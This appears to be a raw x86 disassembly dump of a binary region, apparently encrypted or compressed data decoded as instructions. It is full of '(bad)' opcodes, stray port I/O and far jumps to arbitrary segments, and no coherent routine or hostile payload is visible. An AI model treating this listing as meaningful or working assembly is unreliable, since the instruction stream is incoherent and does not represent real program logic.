  428959:	fld    TBYTE PTR [edx]
  42895b:	and    ebp,eax
  42895d:	push   eax
  42895e:	retf   0xd2e7
  428961:	test   al,0xbc
  428963:	jl     0x4288ed
  428965:	jb     0x428976
  428967:	enter  0xd209,0x96
  42896b:	push   esp
  42896c:	test   DWORD PTR [edi-0x12],0xe6350414
  428973:	sub    DWORD PTR [edi+0x2],edi
  428976:	cwde   
  428977:	fild   WORD PTR ds:0xcbe4844
  42897d:	cmp    edi,0xa34fb1fc
  428983:	out    dx,al
  428984:	pop    ebp
  428985:	mul    ch
  428987:	xor    al,0x84
  428989:	adc    BYTE PTR [eax],ch
  42898b:	enter  0x280a,0xeb
  42898f:	sahf   
  428990:	daa    
  428991:	mov    bl,0x25
  428993:	ffreep st(1)
  428995:	dec    eax
  428996:	out    dx,al
  428997:	mov    eax,0xb04582b
  42899c:	xchg   edi,eax
  42899d:	mov    BYTE PTR [eax-0x5f],al
  4289a0:	call   0xcc2826f5
  4289a5:	ret    
  4289a6:	rol    DWORD PTR [ecx+0x30],1
  4289a9:	call   0x2c320d88
  4289ae:	cld    
  4289af:	xor    al,0x95
  4289b1:	or     BYTE PTR [esp+edx*4+0x6],cl
  4289b5:	push   es
  4289b6:	loopne 0x42893d
  4289b8:	mov    ebx,0x605e5a5
  4289bd:	or     dl,ah
  4289bf:	out    0x73,al
  4289c1:	mov    dl,0x59
  4289c3:	repz test DWORD PTR [ebx+0x129bb904],esi
  4289ca:	pop    edx
  4289cb:	mov    bl,0x80
  4289cd:	test   DWORD PTR [edi],edx
  4289cf:	mov    dh,0x5f
  4289d1:	fld    QWORD PTR [edx]
  4289d3:	cmp    edx,DWORD PTR [eax+0x9]
  4289d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289d7:	test   eax,0xc4c911a8
  4289dc:	xchg   esp,eax
  4289dd:	pusha  
  4289de:	fnstsw WORD PTR [ecx]
  4289e0:	outs   dx,BYTE PTR ds:[esi]
  4289e1:	push   esp
  4289e2:	xchg   esp,eax
  4289e3:	push   ebp
  4289e4:	pop    eax
  4289e5:	shl    DWORD PTR [ebp-0x6d0a8c4e],0x7f
  4289ec:	mov    cl,0xf7
  4289ee:	jae    0x42898d
  4289f0:	sbb    esp,0x19
  4289f3:	out    0xb2,eax
  4289f5:	sub    eax,0xbf1acb93
  4289fa:	mov    dh,0xe5
  4289fc:	lea    ebx,[esi]
  4289fe:	jns    0x428992
  428a00:	and    bl,BYTE PTR [esi-0xa]
  428a03:	and    eax,0xf7b37f6
  428a08:	adc    edx,DWORD PTR [esi]
  428a0a:	stos   DWORD PTR es:[edi],eax
  428a0b:	outs   dx,DWORD PTR ds:[esi]
  428a0c:	push   ebx
  428a0d:	mov    ah,0x15
  428a0f:	leave  
  428a10:	jbe    0x428a8d
  428a12:	sbb    esp,DWORD PTR [eax+0x5e7a622c]
  428a18:	popf   
  428a19:	shr    DWORD PTR ds:0x8b355be1,cl
  428a1f:	sub    DWORD PTR [eax+ecx*2+0x5bd77262],ecx
  428a26:	addr16 xchg ecx,eax
  428a28:	loop   0x428a83
  428a2a:	fdivr  st(6),st
  428a2c:	pop    edx
  428a2d:	and    dh,BYTE PTR [ecx+0x59ef5637]
  428a33:	cli    
  428a34:	push   esi
  428a35:	xor    edi,DWORD PTR [esi]
  428a37:	out    dx,eax
  428a38:	loop   0x4289da
  428a3a:	loope  0x428aa5
  428a3c:	cmp    DWORD PTR [esi+0x16cfe],0x0
	...
  428ab2:	add    BYTE PTR [eax],al
  428ab4:	retf   0x528b
  428ab7:	jnp    0x428b0c
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0xb24bf691
  428ac2:	jp     0x428b0c
  428ac4:	jnp    0x428a75
  428ac6:	add    DWORD PTR [eax],eax
  428ac8:	cmc    
  428ac9:	add    BYTE PTR [eax],al
  428acb:	add    BYTE PTR [edi],dl
  428acd:	pop    ss
  428ace:	daa    
  428acf:	xchg   edx,eax
  428ad0:	xchg   ecx,eax
  428ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ad2:	or     BYTE PTR [eax+edi*8-0x27],bh
  428ad6:	sub    BYTE PTR [ebx],dh
  428ad8:	xchg   esp,eax
  428ad9:	lds    edx,FWORD PTR [edi+0x31]
  428adc:	mov    edi,ecx
  428ade:	fnstsw WORD PTR [ecx-0x60]
  428ae1:	xor    eax,0xef74abee
  428ae6:	imul   ebx,DWORD PTR [ebx-0x7cb64512],0x62
  428aed:	(bad)  [ebp+edx*4+0x44daa912]
  428af4:	mov    ebx,0xc9bd8ba3
  428af9:	xor    eax,DWORD PTR [ebx]
  428afb:	ins    BYTE PTR es:[edi],dx
  428afc:	and    eax,0x4c0e3b8c
  428b01:	iret   
  428b02:	mov    ch,0x20
  428b04:	xor    edi,esp
  428b06:	adc    BYTE PTR [ecx+0x25],dh
  428b09:	mov    ch,BYTE PTR [ebx+0x7134b490]
  428b0f:	shl    bh,0xf5
  428b12:	test   al,0x53
  428b14:	dec    ebp
  428b15:	mov    BYTE PTR [esp+eax*8+0x14],ah
  428b19:	iret   
  428b1a:	cmp    al,0x75
  428b1c:	or     DWORD PTR [eax-0x5c],eax
  428b1f:	push   0xec517c2f
  428b24:	xchg   ecx,eax
  428b25:	in     al,0x6d
  428b27:	fcom   st(6)
  428b29:	or     eax,0xceb30944
  428b2e:	(bad)  
  428b2f:	data16 and BYTE PTR [edi],bh
  428b32:	jecxz  0x428b2f
  428b34:	mov    ecx,0x821ce090
  428b39:	or     esi,DWORD PTR [edx-0x56]
  428b3c:	les    esp,FWORD PTR [ebx]
  428b3e:	add    edi,esp
  428b40:	adc    eax,0x91c61f
  428b45:	mov    DWORD PTR [eax],ecx
  428b47:	test   DWORD PTR [ebx-0x471b5801],ecx
  428b4d:	call   0xb2069080
  428b52:	pop    edx
  428b53:	or     BYTE PTR [esi],dh
  428b55:	inc    edx
  428b56:	cmp    dl,ah
  428b58:	jmp    0x428b37
  428b5a:	sub    DWORD PTR [eax+0x46],0x38115a57
  428b61:	adc    eax,0xf78de321
  428b66:	jge    0x428b6d
  428b68:	(bad)  
  428b69:	xchg   edi,eax
  428b6a:	mov    bl,0x58
  428b6c:	push   es
  428b6d:	cli    
  428b6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b6f:	xchg   ebp,eax
  428b70:	mov    dh,0x1d
  428b72:	shr    BYTE PTR [esi+0x4da525b0],cl
  428b78:	mov    ds:0xd39b4724,eax
  428b7d:	xchg   esi,eax
  428b7e:	pop    esp
  428b7f:	adc    BYTE PTR [ebp+0x54],ah
  428b82:	shl    dl,0xd6
  428b85:	lods   al,BYTE PTR ds:[esi]
  428b86:	xchg   edi,eax
  428b87:	arpl   cx,bp
  428b89:	cdq    
  428b8a:	or     bl,BYTE PTR [ecx+0x59]
  428b8d:	jmp    0xf39c1756
  428b92:	adc    DWORD PTR [ecx],eax
  428b94:	scas   eax,DWORD PTR es:[edi]
  428b95:	push   esi
  428b96:	jmp    ebx
  428b98:	xchg   ecx,eax
  428b99:	mov    ebx,0xe3967873
  428b9e:	(bad)  
  428ba0:	ds test al,0xc0
  428ba3:	pusha  
  428ba4:	push   ebx
  428ba5:	sub    eax,0x4aac163a
  428baa:	les    edx,FWORD PTR [esi+eax*1+0x1eaf6de0]
  428bb1:	test   al,0x9
  428bb3:	dec    eax
  428bb4:	push   0xd4f0822d
  428bb9:	sub    BYTE PTR [ebp-0x68],dl
  428bbc:	or     ecx,ecx
  428bbe:	fldenv [edx+0xf5]
	...
  428c34:	mov    ds:0xf343b050,eax
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x9ad7a28f
  428c41:	imul   edi,DWORD PTR [edx+0x1b07047],0xf500
  428c4b:	add    BYTE PTR [esi],bh
  428c4d:	fnstsw WORD PTR [edx+eax*4]
  428c50:	or     BYTE PTR [esp+esi*1-0x15],0x93
  428c55:	mov    al,ds:0x5b51319b
  428c5a:	pop    eax
  428c5b:	jno    0x428c3a
  428c5d:	add    al,0xf7
  428c5f:	add    dl,dl
  428c61:	mov    bh,0xd9
  428c63:	xor    ch,BYTE PTR [edi+ebp*2]
  428c66:	(bad)  
  428c67:	data16 scas al,BYTE PTR es:[edi]
  428c69:	pop    es
  428c6a:	push   0x3da26985
  428c6f:	loop   0x428ca9
  428c71:	mov    al,0x69
  428c73:	push   0x611f7678
  428c78:	cli    
  428c79:	ret    
  428c7a:	pop    es
  428c7b:	sbb    esi,edx
  428c7d:	jo     0x428cd9
  428c7f:	call   0x6e81:0x74bf181d
  428c86:	popa   
  428c87:	adc    bl,BYTE PTR [edx]
  428c89:	repnz inc esi
  428c8b:	cmp    eax,0xcc4d8a7a
  428c90:	inc    BYTE PTR [edi]
  428c92:	(bad)  
  428c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c95:	lea    ebp,[eax-0x4bbd714c]
  428c9b:	ins    BYTE PTR es:[edi],dx
  428c9c:	mov    esp,0x5b31f2f2
  428ca1:	rol    BYTE PTR [eax-0x1bb7bc25],1
  428ca7:	out    dx,al
  428ca8:	xchg   ebp,eax
  428ca9:	pop    eax
  428caa:	test   DWORD PTR [ecx],edx
  428cac:	jne    0x428ce4
  428cae:	retf   
  428caf:	sub    eax,eax
  428cb1:	dec    ebp
  428cb2:	pop    edx
  428cb3:	mov    esp,ebx
  428cb5:	mov    esi,0x78c1c00a
  428cba:	jle    0x428c6e
  428cbc:	mov    eax,ds:0x651c9ed3
  428cc1:	inc    ebp
  428cc2:	cmp    edx,edi
  428cc4:	mov    dl,0xab
  428cc6:	add    esp,DWORD PTR [ebx]
  428cc8:	pop    ebx
  428cc9:	fstp   DWORD PTR [ebx+ebx*2-0x551c6c23]
  428cd0:	das    
  428cd1:	in     al,0xab
  428cd3:	lahf   
  428cd4:	je     0x428c5b
  428cd6:	out    dx,eax
  428cd7:	dec    ecx
  428cd8:	mov    esi,0x2e93f631
  428cdd:	xor    eax,0x939b87b2
  428ce2:	or     al,BYTE PTR [ecx]
  428ce4:	jbe    0x428d55
  428ce6:	mov    ch,0x13
  428ce8:	adc    DWORD PTR [bx],0x6f630940
  428cef:	xchg   esi,eax
  428cf0:	xor    al,0xd1
  428cf2:	aaa    
  428cf3:	(bad)  
  428cf4:	popf   
  428cf5:	adc    bh,BYTE PTR [esi+ecx*8+0x3e]
  428cf9:	dec    eax
  428cfa:	add    eax,edx
  428cfc:	std    
  428cfd:	aam    0xed
  428cff:	xchg   edx,eax
  428d00:	into   
  428d01:	inc    ebx
  428d02:	shl    DWORD PTR [esi+0x7b],cl
  428d05:	adc    BYTE PTR [edi+0x3854fda6],0xf
  428d0c:	jbe    0x428d77
  428d0e:	(bad)  
  428d0f:	aam    0x97
  428d11:	cmp    esp,esi
  428d13:	or     dl,BYTE PTR [ecx+0x53031262]
  428d19:	jp     0x428d8c
  428d1b:	pop    eax
  428d1c:	dec    esp
  428d1d:	push   esp
  428d1e:	pushf  
  428d1f:	cs enter 0xfa87,0x48
  428d24:	cmp    eax,0x42a92ed8
  428d29:	sahf   
  428d2a:	aaa    
  428d2b:	push   ds
  428d2c:	es pop ss
  428d2e:	fmul   DWORD PTR [edi-0x4e]
  428d31:	arpl   WORD PTR [edx-0x170c4fd8],di
  428d37:	(bad)  
  428d38:	clc    
  428d39:	mov    eax,ds:0x7ae246e9
  428d3e:	adc    edi,ebp
  428d40:	cmp    BYTE PTR [eax],al
	...
  428db2:	add    BYTE PTR [eax],al
  428db4:	mov    eax,0x6d3c25f1
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0x4da9dc9e
  428dc4:	gs mov cl,0x1
  428dc7:	add    ch,dh
  428dc9:	add    BYTE PTR [eax],al
  428dcb:	add    ch,ch
  428dcd:	cs in  al,0xae
  428dd0:	call   0xf9d3:0xb9d6375d
  428dd7:	sbb    esi,DWORD PTR [ecx-0x2f74050f]
  428ddd:	jbe    0x428d93
  428ddf:	and    DWORD PTR [ecx+ebx*4+0xb],ebp
  428de3:	leave  
  428de4:	or     eax,0xf05d719d
  428de9:	popf   
  428dea:	cdq    
  428deb:	push   ds
  428dec:	push   cs
  428ded:	stc    
  428dee:	not    BYTE PTR [edx+0xe4e96fc]
  428df4:	and    cl,BYTE PTR [edi-0x1f398691]
  428dfa:	popa   
  428dfb:	pop    esp
  428dfc:	fcomp  DWORD PTR [edx]
  428dfe:	jno    0x428dd6
  428e00:	sbb    al,BYTE PTR [edi+0x772fc658]
  428e06:	jae    0x428e70
  428e08:	stos   BYTE PTR es:[edi],al
  428e09:	aam    0xf2
  428e0b:	jp     0x428d91
  428e0d:	(bad)  [edi-0x4c]
  428e10:	or     ah,BYTE PTR ds:0x57ea9d97
  428e16:	repz adc DWORD PTR [edx+0x3d],esp
  428e1a:	sub    eax,0x2b305014
  428e1f:	call   0xf695:0xdb7ad6aa
  428e26:	xlat   BYTE PTR ds:[ebx]
  428e27:	sbb    eax,0x39a152c3
  428e2c:	(bad)  
  428e2d:	scas   eax,DWORD PTR es:[edi]
  428e2e:	push   0xf3763f82
  428e33:	dec    edx
  428e34:	xor    eax,0x8ce715a3
  428e39:	push   ecx
  428e3a:	imul   edx,DWORD PTR [esi+0x2c4b657f],0xffffff9b
  428e41:	int    0x9
  428e43:	add    DWORD PTR [ebp+0x58cf24ee],ecx
  428e49:	lods   eax,DWORD PTR gs:[esi]
  428e4b:	neg    DWORD PTR [ecx]
  428e4d:	(bad)  
  428e4e:	mov    cl,0x9a
  428e50:	inc    BYTE PTR [edx]
  428e52:	loope  0x428e9c
  428e54:	std    
  428e55:	mov    esp,0x5dc0e70
  428e5a:	into   
  428e5b:	std    
  428e5c:	mov    ch,0x5d
  428e5e:	pop    ebp
  428e5f:	repnz xchg ebx,eax
  428e61:	js     0x428e4d
  428e63:	stc    
  428e64:	adc    ecx,DWORD PTR [edx+0x7894dfe8]
  428e6a:	mov    esp,0x36c3c4a4
  428e6f:	mov    ecx,DWORD PTR [ebx]
  428e71:	and    esp,edx
  428e73:	iret   
  428e74:	add    ecx,ebx
  428e76:	inc    esp
  428e77:	aam    0x79
  428e79:	fist   DWORD PTR [esi]
  428e7b:	out    0x41,eax
  428e7d:	stos   BYTE PTR es:[edi],al
  428e7e:	fsubr  QWORD PTR [edx-0x210fd8d4]
  428e84:	pop    ds
  428e85:	outs   dx,BYTE PTR ds:[esi]
  428e86:	imul   edi,DWORD PTR [ebp+0x1b0335a5],0x7df2ef6f
  428e90:	jp     0x428ecb
  428e92:	scas   al,BYTE PTR es:[edi]
  428e93:	add    BYTE PTR [edi],0xc1
  428e96:	fbstp  TBYTE PTR [esp+ecx*1]
  428e99:	dec    ebp
  428e9a:	inc    ebp
  428e9b:	xor    eax,0xa963f6a3
  428ea0:	jne    0x428f05
  428ea2:	jbe    0x428ed2
  428ea4:	mov    al,0x44
  428ea6:	and    bl,dl
  428ea8:	shl    DWORD PTR [edx+0x24],0x92
  428eac:	jb     0x428e34
  428eae:	cs cld 
  428eb0:	mov    esp,0x960b9a89
  428eb5:	aas    
  428eb6:	shl    ch,0x44
  428eb9:	or     al,0xba
  428ebb:	cld    
  428ebc:	push   ds
  428ebd:	xchg   esi,eax
  428ebe:	bound  edi,QWORD PTR [edx]
  428ec0:	in     al,dx
	...
  428f31:	add    BYTE PTR [eax],al
  428f33:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	dec    eax
  428f41:	mov    dh,0x84
  428f43:	les    ebx,FWORD PTR [edx-0x4e]
  428f46:	add    DWORD PTR [eax],eax
  428f48:	cmc    
  428f49:	add    BYTE PTR [eax],al
  428f4b:	add    dh,dh
  428f4d:	fidivr WORD PTR [edx-0xd38780c]
  428f53:	lea    ebp,[eax]
  428f55:	lea    eax,es:[ecx]
  428f58:	adc    al,0x13
  428f5a:	jl     0x428f8d
  428f5c:	xchg   BYTE PTR [edx+0x13],cl
  428f5f:	cmc    
  428f60:	aas    
  428f61:	add    esp,DWORD PTR [esi+0x62]
  428f64:	jae    0x428f1e
  428f66:	scas   eax,DWORD PTR es:[edi]
  428f67:	dec    esp
  428f68:	sbb    edi,DWORD PTR [esi-0x77]
  428f6b:	cli    
  428f6c:	leave  
  428f6d:	pop    ebp
  428f6e:	std    
  428f6f:	int    0x22
  428f71:	loop   0x428f7c
  428f73:	mov    ecx,0x4cc52264
  428f78:	jnp    0x428f33
  428f7a:	(bad)  
  428f7c:	aam    0xa5
  428f7e:	jmp    0x7d5c:0x5f546bf8
  428f85:	retf   
  428f86:	jne    0x428fd6
  428f88:	test   al,0xb4
  428f8a:	inc    esi
  428f8b:	add    al,BYTE PTR [eax+0x6b5fc66a]
  428f91:	sbb    BYTE PTR [esp+ebx*1-0x67],bh
  428f95:	inc    ebx
  428f96:	add    DWORD PTR [edi+0x20],ebp
  428f99:	leave  
  428f9a:	aam    0x18
  428f9c:	repz jns 0x428fb0
  428f9f:	pop    eax
  428fa0:	test   edi,ecx
  428fa2:	and    DWORD PTR [ebx+ecx*4-0x53],ebx
  428fa6:	(bad)  
  428fa7:	loop   0x428fd4
  428fa9:	jecxz  0x428f5b
  428fab:	addr16 and edx,ebp
  428fae:	stc    
  428faf:	test   eax,0x43fa904
  428fb4:	test   dl,dl
  428fb6:	scas   eax,DWORD PTR es:[edi]
  428fb7:	leave  
  428fb8:	pop    ecx
  428fb9:	loope  0x428f9d
  428fbb:	imul   esi,DWORD PTR [ebx+0x5c],0xffffffdf
  428fbf:	cli    
  428fc0:	pop    ecx
  428fc1:	dec    edi
  428fc2:	or     ch,bl
  428fc4:	out    dx,al
  428fc5:	and    al,0xfe
  428fc7:	xchg   BYTE PTR [edx+eax*8-0x4d821ba1],bh
  428fce:	push   eax
  428fcf:	push   ebx
  428fd0:	push   eax
  428fd1:	cmp    eax,0x6a3b1545
  428fd6:	fwait
  428fd7:	add    eax,0x5edb8626
  428fdc:	leave  
  428fdd:	int    0x29
  428fdf:	xlat   BYTE PTR ds:[ebx]
  428fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fe1:	into   
  428fe2:	aad    0xa5
  428fe4:	mov    al,0xed
  428fe6:	sub    esi,edx
  428fe8:	xor    al,0xc1
  428fea:	xor    dl,BYTE PTR [ebx]
  428fec:	sbb    edx,ebp
  428fee:	mov    esi,0x279feec8
  428ff3:	cli    
  428ff4:	jmp    0xd6fa:0xac8ad70d
  428ffb:	es inc ebp
  428ffd:	cmc    
  428ffe:	xchg   ecx,eax
  428fff:	add    eax,0x500cb15e
  429004:	dec    edx
  429005:	cmp    eax,DWORD PTR [edx]
  429007:	jmp    0x862cc5e
  42900c:	(bad)  [eax-0x6cbedb60]
  429012:	shl    BYTE PTR [edx+0x1e2fa2a7],cl
  429018:	and    al,0x3d
  42901a:	mov    dl,0xc8
  42901c:	(bad)  
  42901e:	js     0x428fb3
  429020:	adc    BYTE PTR [eax+0xf7fea2b],ah
  429026:	jge    0x428fe9
  429028:	mov    ds:0x1a0ded4d,eax
  42902d:	inc    edi
  42902e:	push   0xfffffffe
  429030:	and    esp,DWORD PTR [esi+ebx*4-0x7e]
  429034:	jecxz  0x428ff3
  429036:	dec    esi
  429037:	mov    edx,0x149da4ba
  42903c:	outs   dx,BYTE PTR ds:[esi]
  42903d:	and    ebx,DWORD PTR [ebx]
  42903f:	xor    eax,0x9b
	...
  4290b4:	fucomip st,st(6)
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0x92b66cf7
  4290c1:	mov    esp,0xb34f2bcd
  4290c6:	add    DWORD PTR [eax],eax
  4290c8:	cmc    
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    BYTE PTR [esi],cl
  4290cd:	sub    BYTE PTR [ecx+edi*4],dl
  4290d0:	dec    esp
  4290d1:	cmp    esi,DWORD PTR [edx]
  4290d3:	xor    bh,BYTE PTR [edx+0x6f93916b]
  4290d9:	add    DWORD PTR [edi+ebx*1+0x31],esi
  4290dd:	out    0xcb,al
  4290df:	(bad)  
  4290e0:	mov    eax,0x6aa50595
  4290e5:	fiadd  DWORD PTR [ecx]
  4290e7:	repnz mov ebx,0x6059fcf5
  4290ed:	jle    0x429078
  4290ef:	push   eax
  4290f0:	mov    bl,0x47
  4290f2:	mov    edx,0x4f609d5d
  4290f7:	lahf   
  4290f8:	sub    cl,ah
  4290fa:	scas   al,BYTE PTR es:[edi]
  4290fb:	adc    ebp,DWORD PTR [ebp+0x49150c2d]
  429101:	fist   DWORD PTR [ebx+edx*1]
  429104:	jp     0x42917d
  429106:	dec    ebx
  429107:	outs   dx,DWORD PTR ds:[esi]
  429108:	sub    eax,0x2c01dffb
  42910d:	jp     0x429144
  42910f:	xor    ebp,DWORD PTR [ebx+0x6dbfb01c]
  429115:	ds jne 0x429120
  429118:	inc    edi
  429119:	dec    ebp
  42911a:	jmp    0x2d906b3e
  42911f:	cwde   
  429120:	pop    ebp
  429121:	add    BYTE PTR [eax-0x71],dl
  429124:	jo     0x429190
  429126:	mov    ecx,0xe894d46c
  42912b:	gs push edx
  42912d:	sbb    al,0xb5
  42912f:	sub    ebx,DWORD PTR [eax]
  429131:	inc    ecx
  429132:	icebp  
  429133:	mov    DWORD PTR [edi+0x57],esi
  429136:	rcl    DWORD PTR [ebx+0x63414d7d],1
  42913c:	mov    esi,DWORD PTR [edx-0x38]
  42913f:	push   ss
  429140:	jne    0x4290d5
  429142:	xor    BYTE PTR [ebp-0x2a],bl
  429145:	mov    dh,0x3c
  429147:	bswap  ebp
  429149:	jge    0x4291b5
  42914b:	imul   BYTE PTR [ebp-0x12]
  42914e:	fsubr  DWORD PTR [edi-0x3ab1bb0b]
  429154:	f2xm1  
  429156:	mov    ecx,0x80d9037c
  42915b:	sbb    BYTE PTR [ecx+edi*1-0x36361c93],bl
  429162:	scas   eax,DWORD PTR es:[edi]
  429163:	sbb    ebp,DWORD PTR [edi]
  429165:	add    eax,0x1f80cacf
  42916a:	cdq    
  42916b:	pop    edx
  42916c:	bnd jo 0x429150
  42916f:	mov    ds:0xaf459f47,eax
  429174:	push   0x5a
  429176:	or     DWORD PTR [ebx*1+0x1f741d94],esp
  42917d:	push   esi
  42917e:	sahf   
  42917f:	fsub   QWORD PTR [ebx]
  429181:	push   esp
  429182:	sbb    DWORD PTR [edi+0x5c],ebp
  429185:	idiv   DWORD PTR [ebp-0x8bd6556]
  42918b:	imul   esi,DWORD PTR [edi],0xffffff80
  42918e:	dec    ebx
  42918f:	aaa    
  429190:	(bad)  
  429192:	(bad)  
  429193:	mov    cl,0x48
  429195:	shl    BYTE PTR [eax+0x455ab4b0],0xb
  42919c:	pop    eax
  42919d:	int    0xf6
  42919f:	out    0x5b,eax
  4291a1:	test   BYTE PTR [ecx],ah
  4291a3:	dec    eax
  4291a4:	push   ecx
  4291a5:	ret    0x9464
  4291a8:	jle    0x429169
  4291aa:	jb     0x429136
  4291ac:	jno    0x4291d3
  4291ae:	sahf   
  4291af:	fld    QWORD PTR [ebx-0x75]
  4291b2:	bswap  esp
  4291b4:	das    
  4291b5:	pop    edi
  4291b6:	test   DWORD PTR [edx+0x7782eeef],ecx
  4291bc:	dec    ebp
  4291bd:	xor    BYTE PTR [esi+ebx*2+0x99],bl
	...
  429234:	(bad)  
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	sub    eax,0x44ea793a
  429245:	mov    ah,0x1
  429247:	add    ch,dh
  429249:	add    BYTE PTR [eax],al
  42924b:	add    BYTE PTR [eax-0x5917b624],dl
  429251:	push   eax
  429252:	pop    esi
  429253:	outs   dx,BYTE PTR ds:[esi]
  429254:	fdiv   st,st(3)
  429256:	cli    
  429257:	call   0xbf07:0x86dfae5e
  42925e:	add    cl,dl
  429260:	dec    edi
  429261:	fiadd  WORD PTR [ecx]
  429263:	out    0xfb,al
  429265:	pop    ebp
  429266:	cmc    
  429267:	test   eax,0x22d08824
  42926c:	xor    BYTE PTR [ebp-0x2c],ch
  42926f:	sar    BYTE PTR [ecx+0x218a0f26],0x9d
  429276:	xchg   ebx,eax
  429277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429278:	(bad)  
  429279:	retf   
  42927a:	pusha  
  42927b:	inc    edi
  42927c:	lods   al,BYTE PTR ds:[esi]
  42927d:	and    edi,edi
  42927f:	inc    ebx
  429280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429281:	fsubr  DWORD PTR [ebx+0x24cae46b]
  429287:	scas   al,BYTE PTR es:[edi]
  429288:	scas   al,BYTE PTR es:[edi]
  429289:	out    0x8f,al
  42928b:	push   es
  42928c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42928d:	ror    DWORD PTR [edi+0x37],1
  429290:	mov    ch,0x64
  429292:	out    0x55,eax
  429294:	push   edi
  429295:	ror    bh,0x17
  429298:	jbe    0x4292f1
  42929a:	es jae 0x429283
  42929d:	dec    ebx
  42929e:	and    cl,BYTE PTR [edi+eiz*2+0x1a1044e6]
  4292a5:	ja     0x42927c
  4292a7:	cmp    bl,BYTE PTR [eax]
  4292a9:	fst    QWORD PTR [edx]
  4292ab:	or     ebx,DWORD PTR [ebx+ebp*1+0x1f681c68]
  4292b2:	and    ebx,esp
  4292b4:	mov    ss,WORD PTR [eax-0x1bfbe9a7]
  4292ba:	inc    ecx
  4292bb:	pop    es
  4292bc:	(bad)
  4292bf:	lods   eax,DWORD PTR ds:[esi]
  4292c0:	adc    BYTE PTR [eax+0x38],ah
  4292c3:	daa    
  4292c4:	add    eax,ebp
  4292c6:	jg     0x429276
  4292c8:	aaa    
  4292c9:	cmp    eax,0x741ec901
  4292ce:	dec    esp
  4292cf:	outs   dx,DWORD PTR ds:[esi]
  4292d0:	pushf  
  4292d1:	mov    dl,0xe4
  4292d3:	aam    0x6
  4292d5:	rcl    bl,cl
  4292d7:	cmc    
  4292d8:	in     al,0x4f
  4292da:	jbe    0x42934e
  4292dc:	aad    0x2c
  4292de:	mov    gs,WORD PTR [ebp-0x67]
  4292e1:	or     BYTE PTR [eax+0x1b],0xc1
  4292e5:	sbb    eax,0xf84bf347
  4292ea:	or     al,0xe7
  4292ec:	aaa    
  4292ed:	data16 stos BYTE PTR es:[edi],al
  4292ef:	sbb    cl,ah
  4292f1:	mov    eax,0x160ae019
  4292f6:	xchg   DWORD PTR [edi-0x13288444],eax
  4292fc:	loope  0x4292f0
  4292fe:	mov    ds:0xb1715604,eax
  429303:	mov    al,0x24
  429305:	push   0xffffffd8
  429307:	jecxz  0x429349
  429309:	ins    BYTE PTR es:[edi],dx
  42930a:	jae    0x429311
  42930c:	dec    edi
  42930d:	inc    ebp
  42930e:	adc    ah,BYTE PTR [ebx+0x77a021e2]
  429314:	xchg   ebp,eax
  429315:	or     DWORD PTR [ecx+0x4e],esi
  429318:	(bad)  
  429319:	and    DWORD PTR [edx+0x53af36d8],esp
  42931f:	test   BYTE PTR [edx],al
  429321:	sub    al,0xc0
  429323:	cmp    eax,0xca9f5e65
  429328:	ss xchg esi,eax
  42932a:	and    bl,BYTE PTR [ebp+0x5205d86e]
  429330:	popf   
  429331:	xchg   ebp,eax
  429332:	mov    ds:0x29082d2b,al
  429337:	push   esp
  429338:	sub    eax,0x519dd7de
  42933d:	idiv   DWORD PTR [esi+eiz*4]
  429340:	repnz add BYTE PTR [eax],al
	...
  4293b3:	add    BYTE PTR [esi],cl
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	mov    ?,WORD PTR [ecx]
  4293c2:	inc    ebx
  4293c3:	and    BYTE PTR [ecx],bh
  4293c5:	mov    ch,0x1
  4293c7:	add    ch,dh
  4293c9:	add    BYTE PTR [eax],al
  4293cb:	add    ah,dh
  4293cd:	(bad)  
  4293ce:	imul   edx,DWORD PTR [ecx-0x3f14983d],0xffffffb3
  4293d5:	push   cs
  4293d6:	pusha  
  4293d7:	fistp  QWORD PTR [esi+eax*4]
  4293da:	sub    BYTE PTR [ecx+0x3e],bl
  4293dd:	retf   
  4293de:	push   esp
  4293df:	mov    edi,0x98ed50ab
  4293e4:	xlat   BYTE PTR ds:[ebx]
  4293e5:	add    BYTE PTR [edi],bl
  4293e7:	jl     0x4293de
  4293e9:	or     al,0x91
  4293eb:	pop    edi
  4293ec:	inc    ebp
  4293ed:	push   eax
  4293ee:	or     eax,0x9c80f036
  4293f3:	ret    
  4293f4:	jnp    0x42943b
  4293f6:	xor    eax,0x860cfdc4
  4293fb:	or     DWORD PTR [esi+0x69],ebx
  4293fe:	inc    ebx
  4293ff:	mov    ecx,edx
  429401:	(bad)  
  429402:	ins    BYTE PTR es:[edi],dx
  429403:	mov    ds:0x585c8474,al
  429408:	std    
  429409:	fnstsw WORD PTR ds:0x2722d0cf
  42940f:	pop    esp
  429410:	sub    ch,bl
  429412:	xchg   DWORD PTR [edi],esp
  429414:	fs push ebx
  429416:	mov    ah,0x14
  429418:	mov    ah,0xa9
  42941a:	push   0xffffffa0
  42941c:	arpl   WORD PTR [edi+0x4a],dx
  42941f:	fisubr WORD PTR [ecx-0x491fc0e]
  429425:	lock or eax,0xef8ca4f
  42942b:	or     al,dl
  42942d:	add    eax,0xad833bf
  429432:	out    0x93,al
  429434:	out    0xcd,eax
  429436:	(bad)  
  429437:	out    dx,eax
